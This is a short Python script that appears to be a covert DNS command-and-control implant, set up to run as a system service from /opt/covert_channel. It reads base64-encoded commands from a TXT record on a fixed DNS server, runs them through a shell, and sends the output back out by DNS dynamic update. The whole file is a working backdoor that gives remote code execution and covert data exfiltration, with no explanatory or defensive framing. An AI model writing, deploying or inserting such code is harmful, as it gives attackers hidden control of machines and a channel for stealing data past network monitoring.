# stored in /opt/covert_channel for system service to be executed
# update to run covertmessage1.research.net again
import dns.resolver
import dns.update
import dns.query
import base64
import subprocess

# DNS server and domain
dns_server = "192.168.47.101"
domain = "research.net"
command_record = "covertmessage2." + domain
response_record = "response2." + domain

MAX_TXT_LENGTH = 255  # Max length of a single TXT record

def decode_message(encoded_message):
    try:
        return base64.b64decode(encoded_message).decode()
    except Exception as e:
        print(f"Error decoding message: {e}")
        return None

def execute_command(command):
    try:
        # Run the command and capture the output
        result = subprocess.run(command, shell=True, text=True, capture_output=True)
        output = result.stdout if result.returncode == 0 else result.stderr
        
        # Send the output back to the DNS server
        send_response(output)
    except Exception as e:
        print(f"Execution failed: {e}")

def send_response(output: str):
    try:
        # Encode the output as base64
        encoded_output = base64.b64encode(output.encode()).decode()

        # Check if the encoded output fits in the DNS TXT record
        if len(encoded_output) > MAX_TXT_LENGTH:
            encoded_output = encoded_output[:MAX_TXT_LENGTH]  # Truncate if it's too large

        # Prepare the DNS update
        update = dns.update.Update(domain + ".")
        update.delete(response_record, 'TXT')  # Clear any old record
        update.add(response_record, 60, 'TXT', encoded_output)  # Add the new response

        # Send the update to the DNS server
        response = dns.query.tcp(update, dns_server)

        # Check if the response was successful
        if response.rcode() != 0:
            print(f"Failed to send response. DNS Response Code: {response.rcode()}")
    except Exception as e:
        print(f"Error sending response: {e}")

def get_command():
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [dns_server]

    try:
        # Query for the command stored in the TXT record
        response = resolver.resolve(command_record, 'TXT')

        for txt_record in response:
            encoded_message = txt_record.to_text().strip('"')  # Decode the base64 message
            decoded = decode_message(encoded_message)
            
            if decoded and decoded != "":
                execute_command(decoded)  # Execute the command if decoded properly
            else:
                print("No command to run.")
    except dns.resolver.NoAnswer:
        print(f"No TXT record found for {command_record}.")
    except dns.resolver.NXDOMAIN:
        print(f"The domain {command_record} does not exist.")
    except Exception as e:
        print(f"DNS Query Failed: {e}")

if __name__ == '__main__':
    get_command()
